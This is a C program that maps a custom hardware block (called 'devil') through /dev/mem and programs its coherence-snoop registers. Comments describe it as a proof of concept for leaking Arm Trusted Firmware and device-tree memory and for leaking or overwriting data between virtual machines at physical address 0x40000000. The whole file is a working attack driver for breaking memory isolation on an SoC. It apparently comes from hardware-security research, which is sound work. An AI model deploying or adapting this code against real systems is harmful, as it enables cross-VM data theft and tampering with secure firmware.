#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

// Control Reg bits
#define EN_pos      0
#define TEST_pos    1
    #define TEST_FUZZ       0
    #define TEST_DELAY_CR   1
    #define TEST_DELAY_CD   2
    #define TEST_DELAY_CL   3
#define FUNC_pos    5
    #define FUNC_OSH        0
    #define FUNC_CON        1
    #define FUNC_ADL        2
    #define FUNC_ADT        3
    #define FUNC_PDT        4
#define CRRESP_pos  9
#define ACFLT_pos   14
#define ADDRFLT_pos 15
#define OSHEN_pos   16
#define CONEN_pos   17
#define ADLEN_pos   18
#define ADTEN_pos   19
#define PDTEN_pos   20

// Status Reg bits
#define OSH_END_pos 0

#define READ_ONCE           0b0000
#define WRITE_LINE_UNIQUE   0b001
#define WRITE_BACK          0b011

int main() {
    int mem_fd;
    unsigned int *map_base;
    unsigned int devil_base = 0x80010000;
    unsigned int *ctrl;
    unsigned int *status;
    unsigned int *p_delay;
    unsigned int *acsnoop;
    unsigned int *base_addr;
    unsigned int *mem_size;
    unsigned int *arsnoop;
    unsigned int *l_araddr;
    unsigned int *h_araddr;
    unsigned int *awsnoop;
    unsigned int *l_awaddr;
    unsigned int *h_awaddr;
    unsigned int *reserved1;
    unsigned int *reserved2;
    unsigned int *reserved3;
    unsigned int *reserved4;
    unsigned int *DATA0;       
    unsigned int *DATA1;           
    unsigned int *DATA2;           
    unsigned int *DATA3;           
    unsigned int *DATA4;           
    unsigned int *DATA5;           
    unsigned int *DATA6;           
    unsigned int *DATA7;           
    unsigned int *DATA8;           
    unsigned int *DATA9;           
    unsigned int *DATA10;          
    unsigned int *DATA11;          
    unsigned int *DATA12;          
    unsigned int *DATA13;          
    unsigned int *DATA14;          
    unsigned int *DATA15;          
    

    // Open /dev/mem to access physical memory
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd == -1) {
        perror("Error opening /dev/mem");
        exit(1);
    }

    // Map physical memory into user space
    map_base = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, devil_base);
    if (map_base == MAP_FAILED) {
        perror("mmap() failed");
        close(mem_fd);
        exit(1);
    }

    ctrl = map_base;
    status = map_base+1;
    p_delay = map_base+2;
    acsnoop = map_base+3;
    base_addr = map_base+4;
    mem_size = map_base+5;
    arsnoop = map_base+6;
    l_araddr = map_base+7;
    h_araddr = map_base+8;
    awsnoop = map_base+9;
    l_awaddr = map_base+10;
    h_awaddr = map_base+11;
    reserved1 = map_base+12;
    reserved2 = map_base+13;
    reserved3 = map_base+14;
    reserved4 = map_base+15;
    DATA0 = map_base+16;
    DATA1 = map_base+17;
    DATA2 = map_base+18;
    DATA3 = map_base+19;
    DATA4 = map_base+20;
    DATA5 = map_base+21;
    DATA6 = map_base+22;
    DATA7 = map_base+23;
    DATA8 = map_base+24;
    DATA9 = map_base+25;
    DATA10 = map_base+26;
    DATA11 = map_base+27;
    DATA12 = map_base+28;
    DATA13 = map_base+29;
    DATA14 = map_base+30;
    DATA15 = map_base+31;

    // Instruction leak  
    //  - ATF (OCM) -> 0xFFFEA000 
    //      To validate, hexdump -C bl31.elf  (start at offset 0x0000a000 ) 
    //  - system-dtb -> 0x00100000
    //      To validate, hexdump -C system.dtb (start at offset 0x00000000)
    // Data leak between VMs 
    //  - Data addr -> 0x40000000
    //      To validate, run ./read_phys_addr which will write in addr 0x40000000
    //      and then this code will leak the data written there

    *h_awaddr = 0x00;
    *l_awaddr = 0x40000000;
    *awsnoop = WRITE_LINE_UNIQUE;
    *DATA0 = 0x11111111;
    *DATA1 = 0x22222222; 
    *DATA2 = 0x33333333; 
    *DATA3 = 0x44444444; 
    *DATA4 = 0x55555555; 
    *DATA5 = 0x66666666; 
    *DATA6 = 0x77777777; 
    *DATA7 = 0x88888888; 
    *DATA8 = 0x99999999; 
    *DATA9 = 0xAAAAAAAA; 
    *DATA10 = 0xBBBBBBBB; 
    *DATA11 = 0xCCCCCCCC; 
    *DATA12 = 0xDDDDDDDD; 
    *DATA13 = 0xEEEEEEEE; 
    *DATA14 = 0xFFFFFFFF; 
    *DATA15 = 0x12345667; 

    printf(" addr = 0x%08x\n", *l_awaddr);
    *ctrl |= (FUNC_ADT << FUNC_pos) // active data leak
            | (1 << ADTEN_pos) // active data leak En
            | (1 << EN_pos); // Enable IP
    // // while (!(*ctrl & (1 << EN_pos)));
    for (size_t i = 0; i < 10000000; i++);   
    printf(" ctrl = 0x%08x\n", *ctrl);   
    *ctrl &= ~(1 << EN_pos); // Disable IP

    // Unmap memory and close /dev/mem
    munmap(map_base, 4096);
    close(mem_fd);
    
    printf("Done!\n");

    return 0;
}
